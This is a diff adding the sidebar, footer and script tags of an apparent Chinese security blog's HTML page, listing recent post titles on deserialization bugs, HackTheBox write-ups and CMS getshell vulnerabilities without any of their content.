+<div class="col-box">
+    <div class="col-box-title">Newest Posts</div>
+    <ul class="post-list">
+        
+        <li>
+            <a href="https://getshe11.com/post/research-on-php-deserialization/" class="post-link">PHP反序列化研究</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/research-on-gitlab-cookie-deserialization-vulnerability/" class="post-link">Gitlab Cookie 反序列化漏洞研究</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/kali-install-clash/" class="post-link">Kali Linux安装Clash</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/pd-chrome-3d/" class="post-link">关于Kali2020安装Parallels Tools后Chrome显示空白</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/install-parallels-tools-on-kali-linux-2020.4/" class="post-link">Kali Linux 2020.4安装Parallels Tools</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/pathfinder/" class="post-link">Hackthebox-Pathfinder</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/domain-security/" class="post-link">Windows认证与域渗透</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/shield/" class="post-link">Hackthebox-Shield</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/archetype/" class="post-link">Hackthebox-Archetype</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/oopsie/" class="post-link">Hackthebox-Oopsie</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/vaccine/" class="post-link">Hackthebox-Vaccine</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/bc-penetration-diary/" class="post-link">Bc站渗透日记</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/maccms8-latest-command-execution-vulnerability/" class="post-link">Maccms8最新命令执行漏洞</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/seacms9.92-from-variable-override-to-getshell/" class="post-link">Seacms9.92从变量覆盖到getshell</a>
+        </li>
+        
+        <li>
+            <a href="https://getshe11.com/post/seacms-front-desk-getshell/" class="post-link">Seacms&lt;=9.92前台Getshell</a>
+        </li>
+        
+    </ul>
+</div>
+
+<div class="col-box post-toc hide">
+    <div class="col-box-title">TOC</div>
+</div>
+            </div>
+        </div>
+    </div>
+    
+    <footer class="footer">
+        <div class="wrapper">
+    © 2021    <a href="https://getshe11.com/">F0rmat</a>
+</div>
+    </footer>
+    
+    
+<script src="https://cdn.jsdelivr.net/npm/jquery@1.11.0/dist/jquery.min.js"></script>
+
+<script src="/js/easybook.js"></script>
+
+<script src="/js/lazysizes.min.js"></script>
+
+<script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.12/dist/js/lightgallery-all.min.js"></script>
+<script src="/js/figure.js"></script>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-XXXXXXXX-X', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+
+
+
+
+</body>
+
+</html>
